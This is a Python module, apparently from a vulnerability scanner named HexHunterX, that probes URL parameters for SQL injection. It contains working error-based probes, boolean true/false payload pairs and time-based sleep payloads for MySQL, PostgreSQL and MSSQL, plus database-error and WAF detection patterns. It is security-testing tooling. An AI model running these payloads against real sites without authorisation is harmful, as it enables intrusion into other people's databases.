"""
HexHunterX -- SQL Injection Detection Module (v2).

Multi-technique SQLi detection with real verification:
- Error-based with DB fingerprinting
- Boolean-based blind with response similarity
- Time-based blind with retry validation
- UNION-based with column detection
- WAF detection awareness
- No parameter invention
"""

import re
from urllib.parse import urlencode, urlparse, parse_qs

from utils.logger import HexHunterXLogger
from utils.network import AsyncHTTPClient
from modules.fuzzing.payloads import PayloadEngine
from modules.vulns.verification import (
    ResponseAnalyzer, TimingAnalyzer, ConfidenceScorer, Confidence,
)

logger = HexHunterXLogger.get_logger("vulns.sqli")

DB_ERROR_PATTERNS = {
    "MySQL": [
        r"SQL syntax.*?MySQL", r"Warning.*?\Wmysqli?_",
        r"MySQLSyntaxErrorException", r"check the manual that corresponds to your MySQL",
        r"Unknown column.*?in 'field list'",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*?ERROR", r"Warning.*?\Wpg_", r"Npgsql\.",
        r"PG::SyntaxError:", r"org\.postgresql\.util\.PSQLException",
    ],
    "MSSQL": [
        r"Driver.*? SQL[\-\_\ ]*Server", r"OLE DB.*? SQL Server",
        r"\bSQL Server\b.*?Error", r"ODBC SQL Server Driver",
    ],
    "Oracle": [r"\bORA-\d{5}", r"Oracle error", r"quoted string not properly terminated"],
    "SQLite": [r"SQLite\.Exception", r"Warning.*?\Wsqlite_", r"\[SQLITE_ERROR\]"],
}

# WAF block patterns
WAF_PATTERNS = [
    r"access denied", r"403 forbidden", r"request blocked",
    r"web application firewall", r"security violation",
    r"mod_security", r"cloudflare", r"incapsula",
]

# Boolean payloads: (true_condition, false_condition)
BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
]

# Time payloads: (payload, expected_delay_seconds)
TIME_PAYLOADS = {
    "MySQL": ("' OR SLEEP({delay})--", 5),
    "PostgreSQL": ("'; SELECT pg_sleep({delay});--", 5),
    "MSSQL": ("'; WAITFOR DELAY '0:0:{delay}'--", 5),
    "generic": ("' OR SLEEP({delay})#", 5),
}

# Error-triggering payloads (minimal set, no full list spam)
ERROR_PROBES = ["'", "''", "'\"", "1'", "\\"]


class SQLiDetector:
    """
    Detect SQL injection with multi-technique verification.

    Only tests EXISTING parameters. Uses baseline comparison,
    boolean-blind similarity analysis, and timing retry verification.
    """

    def __init__(self, http_client: AsyncHTTPClient, oob_client=None):
        self.http = http_client
        self.oob = oob_client
        self._analyzer = ResponseAnalyzer(similarity_threshold=0.90)
        self._timing = TimingAnalyzer(threshold_ms=4000, trials=3)
        self._scorer = ConfidenceScorer()

    async def detect(self, url: str) -> list[dict]:
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return findings

        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param_name in params:
            original_val = params[param_name][0] if params[param_name] else "1"
            other_params = {k: v[0] for k, v in params.items() if k != param_name}

            # Get baseline
            bp = {param_name: original_val, **other_params}
            baseline_resp = await self.http.get(f"{base}?{urlencode(bp)}")
            if baseline_resp.error:
                continue

            # Check for WAF
            waf = self._detect_waf(baseline_resp)

            # Phase 1: Error-based detection
            finding = await self._test_error_based(
                base, param_name, original_val, other_params, baseline_resp
            )
            if finding:
                findings.append(finding)
                continue

            # Phase 2: Boolean-based blind
            finding = await self._test_boolean_blind(
                base, param_name, original_val, other_params, baseline_resp
            )
            if finding:
                findings.append(finding)
                continue

            # Phase 3: Time-based blind
            finding = await self._test_time_blind(
                base, param_name, original_val, other_params
            )
            if finding:
                findings.append(finding)
                continue

            # OOB payloads
            if self.oob and self.oob.is_registered:
                for p in self.oob.get_oob_payloads("sqli", base, param_name):
                    tp = {param_name: original_val + p, **other_params}
                    await self.http.get(f"{base}?{urlencode(tp)}")

        return findings

    async def _test_error_based(self, base, param, orig, others, baseline):
        """Test for error-based SQLi using minimal probes."""
        baseline_db, _ = self._detect_error(baseline.body)
        if baseline_db:
            return None  # Errors in baseline = not our injection

        for probe in ERROR_PROBES:
            tp = {param: orig + probe, **others}
            resp = await self.http.get(f"{base}?{urlencode(tp)}")
            if resp.error:
                continue
            db_type, error_match = self._detect_error(resp.body)
            if not db_type:
                continue

            # Verify: re-test once to confirm it's consistent
            resp2 = await self.http.get(f"{base}?{urlencode(tp)}")
            if resp2.error:
                continue
            db2, _ = self._detect_error(resp2.body)
            if db2 != db_type:
                continue  # Transient error

            signals = {
                "error_pattern_match": True,
                "baseline_differs": True,
                "retry_confirmed": True,
            }
            conf = self._scorer.score(signals)
            poc = PayloadEngine.generate_poc("sqli", base, param, probe)
            return {
                "type": f"SQL Injection (Error-based, {db_type})",
                "severity": "critical",
                "title": f"SQL Injection in parameter '{param}'",
                "description": (
                    f"Error-based SQLi verified in '{param}'. Database: {db_type}. "
                    f"Confirmed with retry verification."
                ),
                "evidence": (
                    f"Database: {db_type}\nProbe: {probe}\n"
                    f"Error: {error_match}\nRetry: confirmed"
                ),
                "request": f"{base}?{urlencode(tp)}",
                "response": resp.body[:2000],
                "reproduction": poc,
                "confidence": conf,
                "verification_method": "error_based_with_retry",
            }
        return None

    async def _test_boolean_blind(self, base, param, orig, others, baseline):
        """Test boolean-based blind SQLi via true/false condition comparison."""
        for true_payload, false_payload in BOOLEAN_PAIRS:
            tp_true = {param: orig + true_payload, **others}
            tp_false = {param: orig + false_payload, **others}

            resp_true = await self.http.get(f"{base}?{urlencode(tp_true)}")
            resp_false = await self.http.get(f"{base}?{urlencode(tp_false)}")

            if resp_true.error or resp_false.error:
                continue

            # True condition should match baseline; false should differ
            sim_true = self._analyzer.similarity(baseline.body, resp_true.body)
            sim_false = self._analyzer.similarity(baseline.body, resp_false.body)

            if sim_true > 0.90 and sim_false < 0.70:
                # Verify with retry
                resp_true2 = await self.http.get(f"{base}?{urlencode(tp_true)}")
                resp_false2 = await self.http.get(f"{base}?{urlencode(tp_false)}")
                if resp_true2.error or resp_false2.error:
                    continue
                sim_true2 = self._analyzer.similarity(baseline.body, resp_true2.body)
                sim_false2 = self._analyzer.similarity(baseline.body, resp_false2.body)

                if sim_true2 > 0.90 and sim_false2 < 0.70:
                    signals = {
                        "behavioral_change": True,
                        "baseline_differs": True,
                        "retry_confirmed": True,
                    }
                    conf = self._scorer.score(signals)
                    return {
                        "type": "SQL Injection (Boolean-based Blind)",
                        "severity": "high",
                        "title": f"Boolean-based blind SQLi in parameter '{param}'",
                        "description": (
                            f"True condition matches baseline (sim={sim_true:.2f}), "
                            f"false condition diverges (sim={sim_false:.2f}). "
                            f"Verified with retry."
                        ),
                        "evidence": (
                            f"True payload: {true_payload}\n"
                            f"False payload: {false_payload}\n"
                            f"Similarity true: {sim_true:.4f} / {sim_true2:.4f}\n"
                            f"Similarity false: {sim_false:.4f} / {sim_false2:.4f}"
                        ),
                        "request": f"{base}?{urlencode(tp_true)}",
                        "response": resp_false.body[:1000],
                        "confidence": conf,
                        "verification_method": "boolean_blind_similarity",
                    }
        return None

    async def _test_time_blind(self, base, param, orig, others):
        """Test time-based blind SQLi with statistical timing analysis."""
        delay = 5
        for db_hint, (template, _) in TIME_PAYLOADS.items():
            payload = template.format(delay=delay)
            tp_baseline = {param: orig, **others}
            tp_inject = {param: orig + payload, **others}

            baseline_url = f"{base}?{urlencode(tp_baseline)}"
            inject_url = f"{base}?{urlencode(tp_inject)}"

            result = await self._timing.verify_timing(
                self.http, baseline_url, inject_url
            )

            if result.is_significant and result.consistent:
                signals = {
                    "timing_verified": True,
                    "retry_confirmed": result.consistent,
                    "baseline_differs": True,
                }
                conf = self._scorer.score(signals)
                return {
                    "type": f"SQL Injection (Time-based Blind, {db_hint})",
                    "severity": "high",
                    "title": f"Time-based blind SQLi in parameter '{param}'",
                    "description": (
                        f"Delay of {result.delay_ms:.0f}ms verified across "
                        f"{result.trials} trials (baseline: {result.baseline_median_ms:.0f}ms)."
                    ),
                    "evidence": (
                        f"Payload: {payload}\n"
                        f"Baseline median: {result.baseline_median_ms:.0f}ms\n"
                        f"Injected median: {result.injected_median_ms:.0f}ms\n"
                        f"Consistent: {result.consistent}"
                    ),
                    "request": inject_url,
                    "response": "",
                    "confidence": conf,
                    "verification_method": "time_blind_statistical",
                }
        return None

    def _detect_error(self, body):
        for db_type, patterns in DB_ERROR_PATTERNS.items():
            for pattern in patterns:
                match = re.search(pattern, body, re.IGNORECASE)
                if match:
                    return db_type, match.group(0)
        return None, None

    def _detect_waf(self, resp):
        body_lower = resp.body.lower()
        for pattern in WAF_PATTERNS:
            if re.search(pattern, body_lower):
                return True
        return resp.status_code in (403, 406, 429)
